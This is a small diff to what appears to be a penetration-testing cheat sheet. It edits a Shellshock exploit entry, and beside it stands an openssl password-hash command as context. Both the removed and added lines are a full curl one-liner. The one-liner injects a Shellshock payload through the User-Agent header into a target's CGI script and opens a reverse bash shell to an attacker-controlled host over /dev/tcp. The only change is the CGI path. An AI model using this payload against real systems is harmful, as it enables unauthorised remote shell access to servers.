@@ -38,5 +38,5 @@ openssl passwd -1 -salt 1234 <password>
 ShellShock
 
 ```shell
-curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa; bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1; echo zzzz;'" http://<target ip>/cgi-bin/admin.cgi | sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}'
+curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa; bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1; echo zzzz;'" http://<target ip>/cgi-bin/home.cgi | sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}'
 ```
